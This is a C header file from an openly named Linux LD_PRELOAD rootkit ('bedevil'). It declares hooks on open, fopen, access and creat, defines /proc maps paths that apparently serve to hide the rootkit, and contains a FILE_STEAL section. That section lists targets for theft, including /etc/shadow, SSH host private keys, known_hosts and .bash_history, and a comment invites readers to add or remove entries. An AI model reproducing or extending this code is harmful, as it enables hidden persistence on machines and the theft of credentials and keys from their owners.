#ifndef OPEN_H
#define OPEN_H

#ifdef FORGE_MAPS
#define MAPS_FULL_PATH  "/proc/*/maps"
#define SMAPS_FULL_PATH "/proc/*/smaps"
#define NMAPS_FULL_PATH "/proc/*/numa_maps"

#define MAPS_PROC_PATH  "*/maps"
#define SMAPS_PROC_PATH "*/smaps"
#define NMAPS_PROC_PATH "*/numa_maps"

#define MAPS_FILENAME  "maps"
#define SMAPS_FILENAME "smaps"
#define NMAPS_FILENAME "numa_maps"
#endif

#ifdef FILE_STEAL
/* the following array contains files that will be stolen by bedevil.
 * feel free to remove/add files. */
static char *interesting_files[15] = {"passwd", "shadow", "sshd_config", "ssh_config", "ssh_host_dsa_key",
                                      "ssh_host_dsa_key.pub", "ssh_host_ecdsa_key", "ssh_host_ecdsa_key.pub",
                                      "ssh_host_ed25519_key", "ssh_host_ed25519_key.pub", "ssh_host_rsa_key",
                                      "ssh_host_rsa_key.pub", "apache.log", "known_hosts", ".bash_history"};
#define INTERESTING_FILES_SIZE sizeofarray(interesting_files)

#define INTEREST_DIR "??INTEREST_DIR??"
#define FILENAME_MAXLEN 128

int interesting(const char *path);
char *get_filename(const char *path);
int write_copy(const char *old_path, char *new_path);
char *get_new_path(char *filename);
int steal_file(const char *old_path, char *filename, char *new_path);
#ifdef LINK_IF_ERR
int link_file(const char *old_path, char *new_path);
#endif
void inspect_file(const char *pathname);
#include "file_snoop.c"
#endif

int open(const char *pathname, int flags, mode_t mode);
int open64(const char *pathname, int flags, mode_t mode);
#include "open.c"

FILE *fopen(const char *pathname, const char *mode);
FILE *fopen64(const char *pathname, const char *mode);
#include "fopen.c"

int access(const char *pathname, int amode);
int creat(const char *pathname, mode_t mode);
#include "access.c"
#endif
